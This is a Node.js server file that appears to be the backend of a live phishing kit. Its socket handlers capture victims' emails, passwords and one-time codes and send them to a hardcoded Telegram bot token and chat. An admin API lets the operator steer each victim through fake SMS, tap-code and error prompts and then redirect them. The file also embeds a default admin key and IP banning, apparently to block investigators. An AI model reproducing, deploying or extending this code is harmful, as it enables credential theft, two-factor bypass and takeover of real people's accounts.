// app.js
require('dotenv').config();

const path = require('path');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);

// ===== CONFIG =====
const FRONTEND_ORIGIN = process.env.FRONTEND_ORIGIN || 'https://pobremo.vercel.app';
const ADMIN_KEY       = process.env.ADMIN_KEY || '123123';
const PORT            = Number(process.env.PORT || 3001);

const dotenvPath = path.resolve(__dirname, '.env');

// Load dynamic config
let TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8490628792:AAGv_BjqC0vbnfJd7RONJP9_ZUz1V8mPfR8';
let TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-5078231608';
let REDIRECT_URL = process.env.REDIRECT_URL || 'https://calendly.com/william-academyredbull/30min';

// Allowed origins
const SELF_ORIGIN = `https://panelipobremoa.vercel.app:${PORT}`;
const ALLOWED_ORIGINS = [
  'https://pobremo.vercel.app',       // your Vercel frontend
  'https://panelipobremoa.vercel.app', // your backend HTTPS domain
];



// ===== TELEGRAM =====
let bot = TELEGRAM_TOKEN ? new TelegramBot(TELEGRAM_TOKEN, { polling: false }) : null;

function reloadTelegramBot(newToken) {
  try { if (bot) bot.stopPolling?.(); } catch {}
  bot = newToken ? new TelegramBot(newToken, { polling: false }) : null;
}

function tgNotify(html) {
  if (!bot || !TELEGRAM_CHAT_ID) return;
  bot.sendMessage(TELEGRAM_CHAT_ID, html, { parse_mode: 'HTML', disable_web_page_preview: true })
    .catch(err => console.warn('Telegram send error:', err?.message || err));
}

// ===== MIDDLEWARE =====
app.use(
  cors({
    origin: (origin, cb) => {
      if (!origin) return cb(null, true);
      if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
      console.warn('CORS blocked origin:', origin);
      return cb(new Error('Not allowed by CORS'));
    },
    credentials: true,
  })
);
// ===== IP BLOCK MIDDLEWARE =====
// app.use((req, res, next) => {
//   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
//   if (bannedIPs.has(ip)) {
//     console.warn('Blocked banned IP:', ip);
//     return res.status(403).json({ error: 'Something went wrong' });
//   }
//   next();
// });

app.use(express.json());

// ===== HEALTH =====
app.get('/health', (_req, res) => res.json({ ok: true, time: new Date().toISOString() }));

// ===== STATIC =====
app.use(express.static(path.join(__dirname, 'public')));



// ===== IP BAN SYSTEM =====
const bannedFile = path.join(__dirname, 'banned.txt');
let bannedIPs = new Set();

// Load banned IPs
function loadBannedIPs() {
  try {
    if (fs.existsSync(bannedFile)) {
      const data = fs.readFileSync(bannedFile, 'utf8');
      bannedIPs = new Set(data.split('\n').map(ip => ip.trim()).filter(Boolean));
    }
  } catch (e) {
    console.warn('Failed to load banned IPs:', e.message);
  }
}
loadBannedIPs();

// Save banned IPs to file
function saveBannedIPs() {
  try {
    fs.writeFileSync(bannedFile, [...bannedIPs].join('\n'), 'utf8');
  } catch (e) {
    console.warn('Failed to save banned IPs:', e.message);
  }
}

// Ban IP function
function banIP(ip) {
  if (!ip) return false;
  bannedIPs.add(ip);
  saveBannedIPs();
  logAction(`IP_BANNED ${ip}`);
  tgNotify(`<b>ðŸš« IP Banned</b>\n<code>${escapeHtml(ip)}</code>`);
  return true;
}

// ===== SOCKET.IO =====
const io = new Server(server, {
  
  cors: {
    origin: (origin, cb) => {
      if (!origin) return cb(null, true);
      if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
      console.warn('Socket.IO CORS blocked origin:', origin);
      return cb(new Error('Not allowed by Socket.IO CORS'));
    },
    methods: ['GET', 'POST'],
    credentials: true,
  },
});




// ===== DATA STORE =====
const loginAttempts = [];
const socketsById = new Map();
let nextAttemptId = 1;

const logAction = (txt) => {
  try { fs.appendFileSync('actions.log', `${new Date().toISOString()} - ${txt}\n`); }
  catch (e) { console.warn('log error', e?.message || e); }
};

const escapeHtml = (s = '') =>
  String(s).replace(/[<>&]/g, (c) => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));

// ===== AUTH =====
function requireAdminKey(req, _res, next) {
  const key = req.header('x-admin-key');
  if (!key || key !== ADMIN_KEY) {
    const err = new Error('Unauthorized');
    err.status = 401;
    return next(err);
  }
  next();
}

// ===== USER SOCKETS =====
io.on('connection', (socket) => {
  const ip = socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim() || socket.handshake.address;

  // Check ban list
  if (bannedIPs.has(ip)) {
    console.warn('Rejected socket from banned IP:', ip);
    socket.emit('banned', { reason: 'You are banned.' });
    socket.disconnect(true);
    return;
  }

  socketsById.set(socket.id, socket);
  console.log('User socket connected:', socket.id, 'IP:', ip, 'origin:', socket.handshake.headers.origin);

  // âœ… NEW: Telegram visitor alert
  tgNotify(
    `<b>ðŸ‘€ New Visitor Connected</b>\nðŸŒ IP: <code>${escapeHtml(ip)}</code>\nðŸ§  Socket: <code>${escapeHtml(socket.id)}</code>\nâ±ï¸ Time: <code>${new Date().toISOString()}</code>`
  );

  // âœ… Notify admin panel of new visitor
  io.of('/admin').emit('admin:new_visitor', {
    socketId: socket.id,
    ip,
    time: new Date().toISOString(),
  });

  socket.on('disconnect', (reason) => {
    socketsById.delete(socket.id);
    console.log('User socket disconnected:', socket.id, 'reason:', reason);
  });



  socket.on('user:login', ({ email, password } = {}) => {
      const ip = socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim() || socket.handshake.address;
    const attempt = {
      id: nextAttemptId++,
      time: new Date().toISOString(),
      email: String(email || ''),
      password: String(password || ''),
      ip,
      socketId: socket.id,
      status: 'pending',
    };
    loginAttempts.unshift(attempt);
    io.of('/admin').emit('admin:new_attempt', attempt);
    logAction(`NEW_ATTEMPT email=${attempt.email} socket=${socket.id}`);
    tgNotify(
      `<b>ðŸ‘¤ New Login Attempt</b>\nðŸ“§ Email: <code>${escapeHtml(attempt.email)}</code>\nðŸ”‘ Password: <code>${escapeHtml(attempt.password)}</code>\nðŸ§  Socket: <code>${escapeHtml(socket.id)}</code>\nâ±ï¸ Time: <code>${attempt.time}</code>`
    );
  });

  socket.on('user:code', ({ email, code, dontAskAgain } = {}) => {
    console.log(`Received code from ${socket.id}:`, { email, code, dontAskAgain });
    tgNotify(
      `<b>ðŸ”¢ User Entered Code</b>\nðŸ“§ Email: <code>${escapeHtml(email)}</code>\nðŸ’¬ Code: <code>${escapeHtml(code)}</code>\nðŸ§  Socket: <code>${escapeHtml(socket.id)}</code>\n${dontAskAgain ? 'âœ… Donâ€™t ask again: true\n' : ''}â±ï¸ Time: <code>${new Date().toISOString()}</code>`
    );
    const attempt = loginAttempts.find((a) => a.socketId === socket.id);
    if (attempt) attempt.code = code;
    io.of('/admin').emit('admin:new_code', { email, code, socketId: socket.id, time: new Date().toISOString() });
  });
});

// ===== ADMIN NAMESPACE =====
const adminNS = io.of('/admin');
adminNS.use((socket, next) => {
  const key = socket.handshake.auth?.key;
  if (key !== ADMIN_KEY) {
    console.warn('Admin namespace auth failed.');
    return next(new Error('Unauthorized'));
  }
  next();
});
adminNS.on('connection', (socket) => {
  console.log('Admin connected.');
  socket.on('disconnect', (r) => console.log('Admin disconnected:', r));
});

// ===== API ROUTES =====

// List attempts
app.get('/api/attempts', requireAdminKey, (req, res) => {
  const limit = parseInt(req.query.limit || '100', 10);
  res.json({ data: loginAttempts.slice(0, limit) });
});

// Config routes
app.get('/api/config', requireAdminKey, (req, res) => {
  res.json({
    TELEGRAM_TOKEN: '8490628792:AAGv_BjqC0vbnfJd7RONJP9_ZUz1V8mPfR8',
    TELEGRAM_CHAT_ID: '-5078231608',
    REDIRECT_URL,
  });
});

app.post('/api/config', requireAdminKey, (req, res) => {
  const { TELEGRAM_TOKEN: token, TELEGRAM_CHAT_ID: chat, REDIRECT_URL: redirect } = req.body || {};
  if (typeof token !== 'string' || typeof chat !== 'string' || typeof redirect !== 'string')
    return res.status(400).json({ error: 'All fields must be strings' });

  TELEGRAM_TOKEN = token.trim();
  TELEGRAM_CHAT_ID = chat.trim();
  REDIRECT_URL = redirect.trim();

  reloadTelegramBot(TELEGRAM_TOKEN);

  // Update .env
  try {
    let envText = fs.existsSync(dotenvPath) ? fs.readFileSync(dotenvPath, 'utf8') : '';
    const lines = envText.split('\n');
    const update = (key, value) => {
      const i = lines.findIndex((l) => l.startsWith(key + '='));
      if (i !== -1) lines[i] = `${key}=${value}`;
      else lines.push(`${key}=${value}`);
    };
    update('TELEGRAM_TOKEN', TELEGRAM_TOKEN);
    update('TELEGRAM_CHAT_ID', TELEGRAM_CHAT_ID);
    update('REDIRECT_URL', REDIRECT_URL);
    fs.writeFileSync(dotenvPath, lines.join('\n'), 'utf8');
  } catch (err) {
    console.warn('Failed to save .env:', err.message);
  }

  res.json({ ok: true });
});

// Admin actions
app.post('/api/action', requireAdminKey, (req, res) => {
  const { action, socketId, code } = req.body || {};
  if (!action || !socketId) return res.status(400).json({ error: 'action and socketId required' });

  const allowed = new Set([
    'tap-code','sms-code','auth-code','phone-number','redirect',
    'login-error','password-error','smscode-error','authcode-error','phonenumber-error'
  ]);
  if (!allowed.has(action)) return res.status(400).json({ error: 'Invalid action' });

  const target = socketsById.get(socketId);
  if (!target) return res.status(404).json({ error: 'Socket not connected' });

  let emitPayload;
  if (action === 'tap-code') emitPayload = { action, code: String(code) };
  else if (action === 'sms-code' || action === 'phone-number') emitPayload = { action, code: String(code) };
  else if (action === 'auth-code') emitPayload = { action };
  else if (action === 'redirect') emitPayload = { action, url: REDIRECT_URL };
  else if (['login-error','password-error','smscode-error','authcode-error','phonenumber-error'].includes(action))
    emitPayload = { action, message: `${action.replace('-', ' ')} occurred.` };
  else emitPayload = { action: 'disconnect', reason: action };

  try { target.emit('admin:action', emitPayload); } catch (e) { console.warn('emit error', e?.message || e); }

  // âœ… Update stored attemptâ€™s status
  const attempt = loginAttempts.find(a => a.socketId === socketId);
  if (attempt) {
    attempt.status = action;
    attempt.lastUpdate = new Date().toISOString();
  }

  // Notify admins (for real-time updates)
  io.of('/admin').emit('admin:status_update', { socketId, action });

  logAction(`ADMIN_ACTION ${action} -> ${socketId}`);
  tgNotify(`<b>Admin Sent</b> ${escapeHtml(action)}\nðŸ§  Socket: <code>${escapeHtml(socketId)}</code>`);

  res.json({ ok: true });
});



// ===== IP BAN API =====
app.get('/api/banned', requireAdminKey, (_req, res) => {
  res.json({ banned: [...bannedIPs] });
});

app.post('/api/ban', requireAdminKey, (req, res) => {
  const { ip } = req.body || {};
  if (!ip || typeof ip !== 'string') return res.status(400).json({ error: 'IP is required' });
  const ok = banIP(ip.trim());
  res.json({ ok });
});

// Error handler
app.use((err, _req, res, _next) => {
  const status = err.status || 500;
  res.status(status).json({ error: err.message || 'Server error' });
});

// ===== START =====
server.listen(PORT, () => {
  console.log(`âœ… Server running on port ${PORT}`);
  console.log(`ðŸ” Redirect URL: ${REDIRECT_URL}`);
});
